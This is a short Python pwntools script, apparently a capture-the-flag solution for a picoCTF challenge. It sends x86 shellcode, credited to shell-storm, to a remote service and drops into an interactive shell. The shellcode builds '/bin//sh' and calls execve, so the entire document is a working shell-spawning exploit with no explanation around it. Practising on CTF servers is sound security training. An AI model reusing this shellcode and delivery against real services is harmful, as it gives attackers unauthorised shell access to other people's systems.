from pwn import *

#Shell code: http://shell-storm.org/shellcode/files/shellcode-811.php

shellcode = b"\x31\xc0\x50\x90\x31\xc0\x31\xc9\xb1\x68\x01\xc8\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\x31\xc9\xb1\x73\x01\xc8\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\x31\xc9\xb1\x2f\x01\xc8\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\x31\xc9\xb1\x2f\x01\xc8\x50\x90\x31\xc0\x31\xc9\xb1\x6e\x01\xc8\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\x31\xc9\xb1\x69\x01\xc8\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\x31\xc9\xb1\x62\x01\xc8\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\xd1\xe0\x31\xc9\xb1\x2f\x01\xc8\x50\x90\x31\xc9\x31\xc0\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\x90\xcd\x80"

p = remote('mercury.picoctf.net',35338)
p.recvline()
p.sendline(shellcode)
p.interactive()